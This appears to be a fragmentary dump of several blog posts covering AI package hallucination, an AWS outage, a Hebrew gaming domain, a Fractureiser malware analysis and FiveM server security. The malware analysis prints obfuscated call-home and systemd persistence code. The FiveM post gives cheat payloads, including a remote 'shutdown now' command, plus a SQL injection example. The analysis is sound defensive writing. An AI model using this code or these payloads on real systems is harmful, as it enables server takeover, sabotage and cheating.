While it has proven to be a powerful tool for generating human-like text, it has also shown a tendency to \"hallucinate\" or generate information that doesn't exist. This behavior has significant implications, especially when recommending software dependencies.</p>\n\n<h2>The Phenomenon of AI Hallucination</h2>\n<p>AI hallucination is a phenomenon where AI models generate outputs that are plausible but not based on factual reality. This is particularly prevalent in large language models (LLMs) like ChatGPT, which have been trained on vast amounts of text data. These models can generate creative yet unexpected responses that may not align with factual reality<sup>1</sup>.</p>\n<p>In software development, one of the most concerning forms of AI hallucination is when ChatGPT recommends software packages or dependencies that do not exist. This behavior, known as \"AI package hallucination,\" can pose significant security risks<sup>2</sup>.</p>\n<h2>The Risks of AI Package Hallucination</h2>\n<p>The problem with AI package hallucination is twofold. First, it can lead developers to waste time and resources trying to integrate non-existent packages into their projects. Second, and more concerning, it can open the door for malicious actors to exploit this behavior.</p>\n<p>Here it works: an attacker can ask ChatGPT for a package to solve a coding problem. <br>If ChatGPT recommends a non-existent package, the attacker can then create a malicious package with the same name and publish it to a package repository. <br>When a developer later asks ChatGPT a similar question, they may receive a recommendation to use the now-existing malicious package.</p>\n<p>This attack technique, dubbed \"AI package hallucination,\" presents a significant security risk. It bypasses traditional security measures to detect suspicious activities like typosquatting or masquerading, making it harder to detect and prevent.</p>\n<h2>Mitigating the Risks</h2>\n<p>Given the potential risks associated with AI package hallucination, developers must thoroughly vet the packages they use. This is especially important when using tools like ChatGPT, which may recommend non-existent or malicious packages.</p>\n<p>Developers can mitigate these risks by checking the creation date of the package, the number of downloads, comments, and any attached notes. If anything looks suspicious, it's best to think twice before installing the package.</p>\n<h2>Sources </h2>\n<ol>\n<li id=\"user-content-fn-1%5E\">\n<p><a href=\"https://vulcan.io/blog/ai-hallucinations-package-risk/\" target=\"_new\">Can you trust ChatGPT’s package recommendations?</a></p>\n</li>\n<li id=\"user-content-fn-2%5E\">\n<p><a href=\"https://www.kevinmd.com/2023/07/lowering-hallucination-results-with-chatgpt.html\" target=\"_new\">Lowering hallucination results with ChatGPT</a></p>\n</li>\n<li id=\"user-content-fn-3%5E\">\n<p><a href=\"https://www.linkedin.com/pulse/developers-take-note-ai-package-hallucination-thing-reversinglabs/\" target=\"_new\">Developers take note: AI package hallucination is a thing</a></p>\n</li>\n</ol>",

However, at approximately 10:30 AM Eastern Time, things began to go awry in Amazon's North Virginia region, known as \"us-east-1\". Over the next three minutes, several regional AWS services started experiencing issues. This wasn't a complete outage for all these services. Still, their functionality was significantly impaired, causing a ripple effect that disrupted the operations of many businesses and services relying on AWS.</p>\n<p>The services affected included the Management console, Route 53, API Gateway, EventBridge, Amazon Connect, and EC2. The outage affected all availability zones in us-east-1 and disrupted a number of global services that are homed in this region. This included AWS Account root logins, Single Sign-On (SSO), and the Security Token Service (STS).</p>\n<h2>Event Timeline </h2>\n<ul>\n<li>\n<p><strong>7:30 AM PST</strong>: An automated activity to scale capacity of one of the AWS services triggered an unexpected behavior, resulting in a significant surge of connection activity that overwhelmed the networking devices between the internal network and the leading AWS network. This caused delays in communication between these networks, leading to increased latency and errors.</p>\n</li>\n<li>\n<p><strong>9:28 AM PST</strong>: AWS teams completed work on moving the internal DNS traffic away from the congested network paths, which resulted in the complete recovery of DNS resolution errors. This improved the availability of several impacted services by reducing the load on the impacted networking devices but did not fully resolve the AWS service impact or eliminate the congestion.</p>\n</li>\n<li>\n<p><strong>1:34 PM PST</strong>: Congestion significantly improved as the operations teams applied remediation actions.</p>\n</li>\n<li>\n<p><strong>2:22 PM PST</strong>: All network devices fully recovered. However, full recovery for Amazon Secure Token Service (STS) occurred at 4:28 PM PST.</p>\n</li>\n<li>\n<p><strong>4:37 PM PST</strong>: API Gateway largely recovered, but customers may have continued to experience low errors and throttling for several hours as API Gateways fully stabilized.</p>\n</li>\n<li>\n<p><strong>5:00 PM PST</strong>: Fargate API error rates began returning to normal.</p>\n</li>\n<li>\n<p><strong>6:40 PM PST</strong>: EventBridge experienced high event delivery latency until this time as it processed the backlog of events.</p>\n</li>\n</ul>\n<h2>The Impact</h2>\n<p>The impact of the outage was broad and far-reaching. It caused various problems for services like Netflix, Disney Plus, Roomba, Ticketmaster, and the Wall Street Journal. It also affected many Amazon services, including Prime Music, Ring doorbells, logistics apps in their fulfillment centers, and some parts of the Amazon.com shopping site.</p>\n<p>The outage highlighted the interconnectedness of digital services and the potential domino effect that can occur when a primary cloud service provider experiences issues. It was a stark reminder of the potential risks of relying heavily on a single cloud service provider.</p>\n<h2>The Root Cause</h2>\n<p>After the dust settled, AWS provided a detailed explanation of what had caused the outage. The root cause was an unexpected behavior triggered by an automated system trying to scale up an internal service running on AWS's private internal network. This led to a significant surge of connection activity that overwhelmed the networking devices between the internal network and the leading AWS network, resulting in delays in communication between these networks.</p>\n<p>These delays increased latency and errors for services communicating between these networks, leading to persistent congestion and performance issues on the devices connecting the two networks. This congestion immediately impacted the availability of real-time monitoring data for AWS's internal operations teams, which impaired their ability to find and resolve the source of congestion.</p>\n<h2>The Aftermath and Lessons Learned</h2>\n<p>The outage had a significant impact on AWS's reputation. However, it also provided valuable lessons for AWS and its users. AWS has since taken several actions to prevent a recurrence of this event. They have turned off the scaling activities that triggered the event and are working on fixing a latent issue that prevented their systems from adequately backing off during the event.</p>\n<p>This incident serves as a reminder of the importance of designing robust and resilient systems. It also underscores the need for effective communication during operational issues. AWS has acknowledged the need to improve customer communication during such events and is planning significant upgrades.</p>\n<h2>Looking Forward</h2>\n<p>While the AWS outage was a significant event that caused widespread disruption, it also provided valuable lessons. It highlighted the importance of resilience in system design and the need for effective communication during operational issues. As AWS continues to learn from this event and improve its systems, users can also take this opportunity to evaluate their systems and consider how they can enhance their resilience to such events in the future.</p>\n<p>In the world of cloud computing, outages are inevitable. However, they can be mitigated through robust system design, effective communication, and continuous learning from past incidents. The December 2021 AWS outage was a stark reminder of this reality. As we progress, cloud service providers and users must take these lessons to heart, continually striving to improve system resilience and response strategies.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"absolute bottom-0 left-0 w-full border-t md:border-t-0 dark:border-white/20 md:border-transparent md:dark:border-transparent md:bg-vert-light-gradient bg-white dark:bg-gray-800 md:!bg-transparent dark:md:bg-vert-dark-gradient pt-2 md:pl-2 md:w-[calc(100%-.5rem)]\"><form class=\"stretch mx-2 flex flex-row gap-3 last:mb-2 md:mx-4 md:last:mb-6 lg:mx-auto lg:max-w-2xl xl:max-w-3xl\">\n<div class=\"relative flex h-full flex-1 items-stretch md:flex-col\" role=\"presentation\">\n<div class=\"\">\n<div class=\"h-full flex ml-1 md:w-full md:m-auto md:mb-2 gap-0 md:gap-2 justify-center\"> </div>\n</div>\n</div>\n</form></div>",

Our infrastructure strategy combines utilizing major cloud providers with managing two physical server farms in Israel. By adopting this approach, our primary objective is to optimize costs and achieve cost savings. We evaluate the most cost-effective options for each application or platform we develop or host. This approach allows us to leverage the advantages of cloud services while maintaining control over specific resources, ensuring flexibility, reliability, and cost efficiency for our organization.</p>\n<h2>Why Did I Choose AWS For This Platform</h2>\n<p>When I initially started developing \"גיימינג.ישראל,\" it was a simple Docker application running on my local PC. Initially, I built the platform from scratch using the <a href=\"https://Frappeframework.com\" target=\"_blank\" rel=\"noopener noreferrer\">Frappe framework</a>. While Frappe is a fantastic framework to work with, I soon realized that this approach would be time-consuming and require significant effort. After two months of development, I decided to transition to <a href=\"https://WordPress.org\" target=\"_blank\" rel=\"noopener noreferrer\">WordPress</a>. WordPress is a well-known platform with extensive documentation, an active community, and a robust foundation.</p>\n<p>The shift to AWS came when we at IMS - Network began migrating applications from our self-hosted servers to the cloud. The primary goal was to free up space on our servers to accommodate gaming servers, as low ping is a critical factor for gamers. <br>We recognized that AWS offered a comprehensive suite of services, scalability, reliability, and the ability to optimize costs. </p>\n<p>Ultimately, the choice to utilize AWS for \"גיימינג.ישראל\" was driven by the need for a scalable and reliable platform, and the desire to streamline development efforts.</p>\n<h2>Infrastructure Setup</h2>\n<p>Our infrastructure consists of several vital services within the AWS environment. Here are details about the services we utilize:</p>\n<figure class=\"post__image\" ><figure class=\"post__image post__image--wide\"><img loading=\"lazy\"  src=\"https://blog.thefourcraft.com/media/posts/55/Gaming-Israel-Wordpress-Network-1.png\" alt=\"Cloudcraft 3D diagram of the infrastructure\" width=\"3840\" height=\"2160\" sizes=\"(max-width: 48em) 100vw, 768px\" srcset=\"https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-xs.png 300w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-sm.png 480w ,https://blog.thefourcraft.com/media/posts/55/responsive/Gaming-Israel-Wordpress-Network-1-md.png 768w\"></figure>\n<figcaption >Cloudcraft 3D diagram of the infrastructure</figcaption>\n</figure>\n<h3>EC2 – Automatic Scaling and System Operations</h3>\n<p>Our system operates on two EC2 instances that host our platform.

How's The Domain Name In Hebrew!?</h2>\n<p>The new Country Code top-level domain (ccTLD) .ישראל has launched! On November 22, 2022, the Israel Internet Association (ISOC-IL) started offering the public the option to register Hebrew domain names under a new national TLD – .ישראל. Now, Israelis have two available TLDs: ישראל and .il.</p>\n<p>Notably, while the ability to register a .ישראל domain is exciting, it's important to note that not all web apps and online services may support it initially. ISOC-IL is actively working to expand the support for the new TLD in various apps and platforms. Still, this process will take time due to the many browsers, messaging apps, online services, and email apps available.</p>\n<h3>How do non-Latin domain names work?</h3>\n<p>Domain names in Hebrew (and other languages) utilize a set of standards called IDN (Internationalized Domain Names). Hebrew domain names are translated into strings containing Latin letters, numbers, and hyphens, decoded by the domain name system (DNS). For example, the domain name \"גיימינג.ישראל\" is represented as \"xn--6dbauaa3ap.xn--4dbrk0ce\". While many browsers already support IDN standards, email software, and other applications still adopt them.</p>\n<h3>Wait... How Did You Manage To Acquire The Domain Name \"gaming.Israel\"</h3>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\"> </div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>You may have noticed that \"גיימינג.ישראל\" translates to \"gaming.Israel,\" which is a precious domain, similar to domains like gaming.com or apple.com. Acquiring such a domain requires registering during the sunrise period:</p>\n<h4>What is the sunrise period for a new gTLD?</h4>\n<p>When a new gTLD is launched, a <strong>sunrise period of at least 30 days is required before domain names are offered to the general public</strong> During the Sunrise period, you can register a domain name for 1 to 10 years, depending on the registry rules</p>\n<h4>So How Did I Buy \"גיימינג.ישראל\"</h4>\n<p>During the sunrise period, many large enterprises typically reserve their domains. However, individuals and organizations also seek unique names to purchase for future use. The same held true for the new gTLD domain, .ישראל.</p>\n<p>When I first heard about the new gTLD, I was eager to acquire \"גיימינג.ישראל\" right from the start. Without hesitation, I promptly approached a verified domain registrar and engaged in a bidding war with one of the prominent telecommunication providers in Israel. After numerous rounds of bidding, I emerged victorious! 😈</p>\n<h2>About The \"גיימינג.ישראל\" Platform</h2>\n<p>The motivation behind creating the \"גיימינג.ישראל\" platform stemmed from a desire to address several challenges faced by the Israeli gaming community. As a player and a gaming community owner, I noticed that the community was fragmented due to the lack of a centralized platform where players could quickly discover and join various gaming communities in Israel.</p>\n<p>Existing server lists in other countries often proved to be complicated to navigate, had poor design, or lacked adequate security measures. Additionally, many Israeli gamers resorted to seeking gaming communities in the US or EU due to the absence of a comprehensive platform in Israel. However, the major obstacle they faced was the issue of high ping, which negatively impacted their gaming experience when playing on servers located far away.</p>\n<p>With the \"גיימינג.ישראל\" platform, I aimed to provide a solution that would address these challenges and unite the Israeli gaming community. Players can easily find and join gaming servers within Israel by offering a user-friendly and secure platform. This enhances the gaming experience and fosters a stronger sense of community among Israeli gamers.</p>\n<p>Through \"גיימינג.ישראל,\" gamers can discover a wide range of local gaming communities, connect with fellow players, and engage in thrilling adventures unique to Israel. By eliminating the ping issue associated with distant servers, the platform enables Israeli gamers to embrace and enjoy gaming experiences within their own country fully.</p>\n<p>The vision behind \"גיימינג.ישראל\" is to create a vibrant and unified gaming ecosystem in Israel, where players can effortlessly explore, connect, and collaborate. Together, we can build a strong and thriving gaming community that showcases the talent and creativity of Israeli gamers to the world. Join us on \"גיימינג.ישראל\" and unlock the full potential of gaming in Israel!</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",

This blog post aims to shed light on this devastating outbreak, providing an in-depth analysis of the malware, its impact, and the steps taken by the community to combat it.</p>\n\n<h2>The Emergence of Fractureiser</h2>\n<p>The Fractureiser malware was first discovered when a Minecraft server hosting company, MCHost.no, was contacted by a customer reporting that his server was not starting correctly. The server would freeze when loading the plugins, a symptom that usually indicates a problem with a faulty or incompatible plugin. However, after several days of back and forth, it was discovered that the issue was much more severe. The customer's plugins were infected with a \"virus\" that he had unknowingly downloaded from a shady <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<p>The malware was traced back to a class file named \"Updater.Class\" found in the infected plugins. The file was encoded and could not be decompiled using standard methods, making it difficult to understand its functionality <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>. However, further investigation revealed that the malware connected to a host via an encoded URL <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-3\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<h2>The Fractureiser's Modus Operandi</h2>\n<p>The Fractureiser malware operates by infecting Minecraft mods and spreading across servers. It uses a class file named \"Updater.Class\" to infect plugins and then connects to a host via an encoded URL <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-4\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.

The malware has also infected several Bukkit plugins <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-7\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>. At the time of detection, the total non-unique downloads for some of the infected mods and plugins were in the hundreds, indicating the widespread nature of the infection <sup><a href=\"https://support.curseforge.com/en/support/solutions/articles/9000228509-june-2023-infected-mods-detection-tool/\" id=\"user-content-fnref-4%5E-8\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">2</a></sup>.</p>\n<p>The following code snippets are from the Fractureiser malware and provide insight into how it operates:</p>\n<p>This snippet shows how the malware connects to a host via an encoded URL:</p>\n<pre><code>HttpURLConnection var2 = (HttpURLConnection)(new URL(new String(Base64.getDecoder().decode(\"aHR0cDovL2ZpbGVzLnNreXJhZ2UuZGUvdXBkYXRl\")))).openConnection();</code></pre>\n<p>The malware connects to a host using an encoded URL. The URL is decoded from Base64 format and then used to open a connection. This method allows the malware to hide the URL it connects to, making it harder for security systems to detect and block it.</p>\n<p>This snippet shows how the malware sets itself up for continued access:</p>\n<pre>var0 = new File(\"/bin/vmd-gnu\");<br>File var1 = new File(\"/etc/systemd/system/vmd-gnu.service\");<br>String var2 = \"[Unit]\\\\nDescription=vmd-gnu local service\\\\nAfter=network.target\\\\nStartLimitIntervalSec=0\\\\n\\\\n[Service]\\\\nType=simple\\\\nRestart=always\\\\nRestartSec=1\\\\nUser=\" + System.getProperty(\"user.name\") + \"\\\\nExecStart=/bin/sh -c \\\\\\\"java -Dauto=true -jar /bin/vmd-gnu\\\\\\\"\\\\n\\\\n[Install]\\\\nWantedBy=multi-user.target\";<br>URL var3 = O.class.getProtectionDomain().getCodeSource().getLocation();<br>Files.copy((new File(var3.getFile())).toPath(), var0.toPath(), StandardCopyOption.REPLACE_EXISTING);<br>Files.write(var1.toPath(), var2.getBytes(), new OpenOption[0]);<br>Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"systemctl enable vmd-gnu\"}).waitFor();<br>Runtime.getRuntime().exec(new String[]{\"/bin/sh\", \"-c\", \"systemctl start vmd-gnu\"}).waitFor();</pre>\n<p>The malware sets itself up for continued access by creating a new service in the system. It creates a new file in the \"/bin\" directory and a new service in the \"/etc/systemd/system\" directory. The service is configured to restart always, ensuring that the malware remains active even if the system is rebooted or the process is killed. The service runs with the same privileges as the user, allowing it to perform actions on behalf of the user.</p>\n<h2>The Aftermath</h2>\n<p>The aftermath of the Fractureiser malware outbreak was intense activity within the Minecraft community. The hosting company, MCHost.no, took immediate steps to block the domain associated with the malware, thereby reducing its potential harm<sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>. The customer whose server was initially infected had to reinstall all plugins and server.jar, but after these steps, the server was no longer connecting to the malicious server <sup><a href=\"https://ljskatt.no/analysis/updater_class/\" id=\"user-content-fnref-1%5E-2\" data-footnote-ref=\"true\" aria-describedby=\"footnote-label\" target=\"_new\">1</a></sup>.</p>\n<p>The community also rallied to provide support and solutions.

            "content_html": "<p>A deep dive into FiveM server security, This post aims to shed light on why these servers are insecure and how cheaters can exploit these insecurities.</p>\n\n<h2>Introduction</h2>\n<p>FiveM is a modification framework for Grand Theft Auto V, enabling you to play multiplayer on customized dedicated servers. Despite its popularity and extensive features, FiveM servers are often criticized for their security vulnerabilities.</p>\n<h2>Understanding the Threat Landscape</h2>\n<p>Before we can effectively secure our servers, we must first understand what we're up against. Hackers and cheaters are constantly finding new ways to exploit server vulnerabilities, and their methods are often as sophisticated as diverse.</p>\n<h2>Understanding Resources and Streaming</h2>\n<p>In a FiveM server, resources are the addons that allow you to customize your server. These resources can be scripts, maps, vehicles, etc. They are streamed to the player when they connect to the server and during their gameplay. This streaming process allows for a dynamic and immersive gaming experience. However, it also opens up potential security vulnerabilities.</p>\n<h1>Insecure Resources</h1>\n<h2>What is an Insecure Resource?</h2>\n<p>To understand the concept of an insecure resource, we must delve into the possibilities a resource provides to a cheater. In an ideal scenario, a resource should validate the input it receives from clients multiple times. However, in reality, many resources accept input without a second thought, sometimes even allowing the execution of arbitrary code on your server.</p>\n<p>You might think, isn't executing code harmless? What harm could come from it? Well, let's consider an example. Here's a quick and easy way to stop a Linux-Based Server (the entire server, not just the FiveM Server!) if the FXServer is run with administrative privileges:</p>\n<pre><code>TriggerServerEvent(\"RunCode:RunRemotelly\", \"os.execute('shutdown now')\")</code></pre>\n<p>Yes, it's that simple. But remote code execution isn't the only thing a cheater can do. What if a cheater wants to do something seemingly harmless, like giving themselves money? Here's an example:</p>\n<pre><code>for i=1, 100 do</code><br><code>    TriggerServerEvent(\"esx_carsshop:sv:1\", 5000, \"cheated\", \"cheated\")</code><br><code>end</code></pre>\n<div class=\"bg-black rounded-md mb-4\">\n<h1>SQL Injections</h1>\n<h2>SQL Injection in FiveM Servers</h2>\n<p>In my blog, I have talked about <a href=\"https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">How to prevent SQL injections in your FiveM server </a><br>In the context of FiveM servers, SQL injection can be particularly damaging, which is why developers and server owners must pay close attention to prevent <a href=\"https://blog.thefourcraft.com/securing-your-fivem-server-from-sql-vulnerabilities/index.html\" target=\"_blank\" rel=\"noopener noreferrer\">SQL injections</a></p>\n<h2>Understanding SQL Injection</h2>\n<p>SQL injection, also known as SQLI, is a common attack vector that uses malicious SQL code for backend database manipulation to access information not intended to be displayed. This information may include sensitive company data, user lists, or private customer details. The impact SQL injection can have on a business is far-reaching. <br>A successful attack may result in unauthorized viewing of user lists, deletion of entire tables, and the attacker gaining administrative rights to a database in certain cases. All of these outcomes are highly detrimental to a business.</p>\n<p>SQL injections typically fall under three categories: In-band SQLi (Classic), Inferential SQLi (Blind), and Out-of-band SQLi.</p>\n<ul>\n<li>\n<p><strong>In-band SQLi: </strong>The attacker uses the same communication channel to launch their attacks and gather their results. It's one of the most common types of SQLi attack due to its simplicity and efficiency.</p>\n</li>\n<li>\n<p><strong>Inferential (Blind) SQLi:</strong> The attacker sends data payloads to the server and observes the response and behavior of the server to learn more about its structure. This method is called blind SQLi because the data is not transferred from the website database to the attacker, thus the attacker cannot see information about the attack in-band.</p>\n</li>\n<li>\n<p><strong>Out-of-band SQLi:</strong> The attacker can only carry out this form of attack when certain features are enabled on the database server used by the web application. This attack is primarily used as an alternative to the in-band and inferential SQLi techniques.</p>\n</li>\n</ul>\nSQL injection can be used to manipulate a standard SQL query to exploit non-validated input vulnerabilities in a database.</div>\n<div class=\"bg-black rounded-md mb-4\">For example, an attacker could alter a typical website’s SQL database query to read <code>http://www.website.com/items/items.asp?itemid=999 or 1=1</code>. As a result, the corresponding SQL query would look like this:</div>\n<pre><code>SELECT ItemName, ItemDescription</code><br><code>FROM Items</code><br><code>WHERE ItemNumber = 999 OR 1=1</code></pre>\n<div>\n<p>And since the statement 1 = 1 is always true, the query returns all of the product names and descriptions in the database, even those that you may not be eligible to access.</p>\n<h1>The RCON Exploit</h1>\n<h2>Understanding the RCON Exploit</h2>\n<p>The RCON exploit revolves around the misuse of the RCON password, a password used to provide remote console access to a server. If this password is known or easily guessable, it can be used to gain unauthorized access to the server. This is particularly concerning if the server is running on an account with administrative privileges, as it allows for the execution of arbitrary commands on the server.</p>\n<p>The exploit works by first gaining access to the RCON of the server. Once access is gained, the attacker can use the 'runcode' resource, a base FiveM resource found on almost every FiveM server, to execute code on the server, on a specific client, or all clients at once.</p>\n<p>The attacker can then use the 'os.execute()' function to run commands on the server's command line, create temporary files to store the output of these commands, and then read these files to gain information about the server. This can be used to find out the current user account running the server, change the password of this account, or even create a new user account with administrative privileges.</p>\n<h2>The Potential Damage</h2>\n<p>The potential damage from this exploit is significant. An attacker could take over the entire machine, infect resources with malicious code, install keyloggers or trojans to log sensitive information, or even use the machine as part of a Distributed Denial of Service (DDoS) attack.</p>\n<p><span style=\"color: var(--headings-color); font-family: var(--font-base); font-size: 1.60181em; font-weight: var(--font-weight-bold); letter-spacing: var(--letter-spacing);\">How to Build A Secure FiveM Server</span></p>\n</div>\n<div class=\"bg-black rounded-md mb-4\">\n<p>Securing your resources is challenging, especially if you are unfamiliar with coding. <br>It is strongly recommended to get someone who is capable of coding on board and then auditing your resources. There is no \"one-check-finds-all\" solution. Every resource requires its way of securing it against cheaters and hackers. However, simply not accepting random input, as many resources do, ensures your server is free of cheaters.</p>\n<p>A good example of correctly using the inbuilt FiveM permission system is vMenu and EasyAdmin. These resources double-check each event with the ACE Natives, ensuring that no one can do things they shouldn't be able to do.</p>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">\n<p>On another note, employing <a href=\"https://www.vaultproject.io/\" target=\"_blank\" rel=\"noopener noreferrer\">Vault by HashiCorp</a> to rotate secrets, such as the RECON password, is highly advisable. Regularly changing your RCON password is strongly recommended, and ensuring it is not easily guessable is essential. Disabling RCON altogether is also recommended as an additional security measure if feasible.</p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<p>In addition to these measures, it's important to regularly audit your resources and ensure they are not accepting random input. This goes a long way in ensuring your server is free of cheaters and hackers.</p>\n<p>While FiveM servers offer a unique and customizable gaming experience but are not without security vulnerabilities. Server owners must understand these vulnerabilities and take the necessary steps to secure their servers.</p>\n<h2>So Why FiveM Servers Are So Insecure</h2>\n<div class=\"group w-full text-gray-800 dark:text-gray-100 border-b border-black/10 dark:border-gray-900/50 bg-gray-50 dark:bg-[#444654]\">\n<div class=\"flex p-4 gap-4 text-base md:gap-6 md:max-w-2xl lg:max-w-[38rem] xl:max-w-3xl md:py-6 lg:px-0 m-auto\">\n<div class=\"relative flex w-[calc(100%-50px)] flex-col gap-1 md:gap-3 lg:w-[calc(100%-115px)]\">\n<div class=\"flex flex-grow flex-col gap-3\">\n<div class=\"min-h-[20px] flex items-start overflow-x-auto whitespace-pre-wrap break-words flex-col gap-4\">\n<div class=\"markdown prose w-full break-words dark:prose-invert dark\">The primary concern lies with server owners who neglect proper security measures. Securing a FiveM server necessitates a proactive approach. <br>By comprehending potential vulnerabilities and implementing suitable security measures, server owners can safeguard their servers and establish a secure and equitable gaming environment for their players. Always remember, in cybersecurity, a potent offense is the best defense.</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>",
